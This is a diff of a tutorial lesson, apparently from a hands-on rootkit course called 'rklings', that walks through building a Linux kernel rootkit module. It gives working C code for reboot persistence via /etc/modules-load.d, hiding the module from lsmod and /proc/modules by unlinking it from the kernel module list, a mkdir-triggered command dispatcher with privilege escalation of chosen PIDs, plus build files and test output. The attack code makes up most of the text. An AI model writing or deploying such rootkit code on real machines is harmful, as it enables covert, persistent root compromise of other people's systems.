@@ -1,98 +1,178 @@
-# Persist across reboot and hide from lsmod
+# M00: Persistence and Stealth
 
-This milestone adds two capabilities to your dispatcher: reboot survival and
-module cloaking.
-Each one is about 10 lines of kernel code, wired through the command dispatcher
-you built in L09.
+Your module works until reboot, and anyone can see it in `lsmod`.
+Fix both.
 
-After this milestone, you have 8 commands:
+## Persistence
 
-| Command | Action |
-|---------|--------|
-| e       | Escalate current process |
-| e.PID   | Escalate target PID |
-| ping    | Log acknowledgment |
-| status  | Log state |
-| persist | Survive reboot |
-| unpersist | Remove reboot persistence |
-| h.m     | Hide module from lsmod |
-| u.m     | Unhide module |
-
-## Persistence with filp_open and kernel_write
-
-Linux loads modules listed in `/etc/modules-load.d/*.conf` at boot.
-To persist, write the module name into that directory from kernel space:
+systemd reads every `.conf` file in `/etc/modules-load.d/` at boot and loads the
+named modules.
+Writing "rklings" to that directory makes the module survive reboot:
 
 ```c
-struct file *f;
-loff_t pos = 0;
+static int rk_persist(void)
+{
+	struct file *f;
+	loff_t pos = 0;
 
-f = filp_open("/etc/modules-load.d/rklings.conf",
-              O_WRONLY | O_CREAT | O_TRUNC, 0644);
-if (IS_ERR(f))
-    return PTR_ERR(f);
-kernel_write(f, "rklings\n", 8, &pos);
-filp_close(f, NULL);
+	f = filp_open("/etc/modules-load.d/rklings.conf",
+		      O_WRONLY | O_CREAT | O_TRUNC, 0644);
+	if (IS_ERR(f))
+		return PTR_ERR(f);
+	kernel_write(f, "rklings\n", sizeof("rklings"), &pos);
+	filp_close(f, NULL);
+	return 0;
+}
 ```
 
-`filp_open` opens a file using a kernel file handle.
-`kernel_write` writes data from kernel memory (no userspace copy needed).
-The `pos` parameter tracks the file offset.
+`filp_open` opens a file from kernel context (no userspace fd table).
+`kernel_write` writes without copy_from_user.
+`O_TRUNC` replaces existing content.
+Unpersist writes an empty file to the same path.
 
-To unpersist, open the same path and write an empty file (or truncate it).
+## Module hiding
 
-## Module cloaking with list_del
-
-The kernel tracks loaded modules in a doubly linked list.
-`lsmod` walks this list.
-Removing your module from it makes you invisible:
+The kernel tracks loaded modules in a doubly-linked list.
+`lsmod` iterates this list.
+Removing your node makes the module invisible:
 
 ```c
-static struct list_head *saved_prev;
+void rk_module_hide(void)
+{
+	saved_prev = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+}
 
-// Hide: remove from the module list
-saved_prev = THIS_MODULE->list.prev;
+void rk_module_unhide(void)
+{
+	list_add(&THIS_MODULE->list, saved_prev);
+}
+```
+
+`THIS_MODULE` is a pointer to the current module's `struct module`.
+`list_del` removes the node from the list.
+`saved_prev` remembers the insertion point so `list_add` can restore it.
+The module still runs, it just disappears from `lsmod` and `/proc/modules`.
+
+## Multi-file split
+
+This is your first multi-file kernel module.
+The L09 monolith splits into subsystems, each in its own file:
+
+```text
+  mkdir rklings.persist
+    |
+    v
+  dispatch.c: strip "rklings." prefix, longest-prefix match
+    |
+    v
+  module.c: cmd_persist() --> rk_persist()
+    |
+    v
+  filp_open + kernel_write --> /etc/modules-load.d/rklings.conf
+```
+
+Each file registers only its own commands via `rk_cmd_register`:
+
+- `cred.c` registers `"e"` (escalation)
+- `module.c` registers `persist`, `unpersist`, `h.m`, `u.m`
+- `init.c` registers `ping`, `status`
+
+## Command dispatch
+
+`rk_cmd_register(key, handler)` adds entries to a static array.
+`rk_dispatch(name)` strips the `"rklings."`
+prefix, then finds the longest matching key.
+`"persist"` matches `"persist"` exactly.
+`"e.1234"` matches `"e"` with arg `"1234"`.
+
+## You write
+
+5 files, multi-file Kbuild:
+
+| File | Responsibility | ~Lines |
+|------|---------------|--------|
+| `include/rootkit.h` | Shared declarations, registration API | ~25 |
+| `core/init.c` | module_init/exit, ping, status | ~50 |
+| `core/dispatch.c` | Command registry, mkdir kretprobes | ~120 |
+| `core/cred.c` | Self + PID escalation, "e" command | ~60 |
+| `core/module.c` | Persistence, module hiding, 4 commands | ~60 |
+
+```make
+ccflags-y := -I$(src)/include
+obj-m += rklings.o
+rklings-y := core/init.o core/dispatch.o core/cred.o core/module.o
+```
+
+## API
+
+```c
+// Command registration (dispatch.c)
+typedef int (*rk_handler_t)(const char *arg);
+int rk_cmd_register(const char *key, rk_handler_t handler);
+int rk_dispatch(const char *name);
+
+// Persistence (module.c)
+struct file *filp_open(const char *path, int flags, umode_t mode);
+ssize_t kernel_write(struct file *f, const void *buf, size_t count,
+    loff_t *pos);
+int filp_close(struct file *f, fl_owner_t id);
+
+// Module hiding (module.c)
 list_del(&THIS_MODULE->list);
-
-// Unhide: re-insert after the saved predecessor
 list_add(&THIS_MODULE->list, saved_prev);
+
+// Subsystem init
+int rk_cred_init(void);     // registers "e"
+int rk_module_init(void);   // registers persist, unpersist, h.m, u.m
 ```
 
-Save `list.prev` before deleting so you can restore the module later.
-Without it, you cannot re-insert at the right position.
+8 mkdir commands:
 
-The module still runs normally while hidden.
-Only its listing is removed.
-`rmmod` will not find it either, so always unhide before unloading.
+| Command | Owner |
+|---------|-------|
+| `rklings.e` / `rklings.e.<pid>` | cred.c |
+| `rklings.ping` | init.c |
+| `rklings.status` | init.c |
+| `rklings.persist` | module.c |
+| `rklings.unpersist` | module.c |
+| `rklings.h.m` | module.c |
+| `rklings.u.m` | module.c |
 
-## Your task
+## Test it
 
-1. Write `rk_persist()` using filp_open + kernel_write
-2. Write `rk_unpersist()` to remove the conf file
-3. Write `rk_module_hide()` using list_del
-4. Write `rk_module_unhide()` using list_add
-5. Add "persist", "unpersist", "h.m", "u.m" to the dispatcher
-6. Call `rk_module_unhide()` in the exit function (safety net)
-
-## Verify
-
-```sh
-$ mkdir rklings.persist
-$ cat /etc/modules-load.d/rklings.conf
+```
+$ rklings run m00
+root@vm:~# insmod rklings.ko
+root@vm:~# mkdir rklings.persist
+root@vm:~# cat /etc/modules-load.d/rklings.conf
 rklings
-$ mkdir rklings.h.m
-$ lsmod | grep rklings
+root@vm:~# mkdir rklings.h.m
+root@vm:~# lsmod | grep rklings
 (no output)
-$ mkdir rklings.u.m
-$ lsmod | grep rklings
-rklings  ...
-$ mkdir rklings.unpersist
-$ cat /etc/modules-load.d/rklings.conf
-(empty or missing)
+root@vm:~# mkdir rklings.u.m
+root@vm:~# lsmod | grep rklings
+rklings  16384  0
+root@vm:~# mkdir rklings.unpersist
+root@vm:~# cat /etc/modules-load.d/rklings.conf
+(empty)
 ```
 
-Run:
+## Validate
 
-```sh
-./rklings check
 ```
+$ rklings validate m00
+  [+] module loaded
+  [+] persist writes /etc/modules-load.d/rklings.conf
+  [+] unpersist clears conf file
+  [+] module hidden from lsmod
+  [+] module unhidden, visible again
+  [+] escalation still works
+  [+] module unloads cleanly after unhide
+  PASS
+```
+
+## Next
+
+L10 builds the thread-safe target list that tracks what to hide from ls, ps,
+cat, and ss.
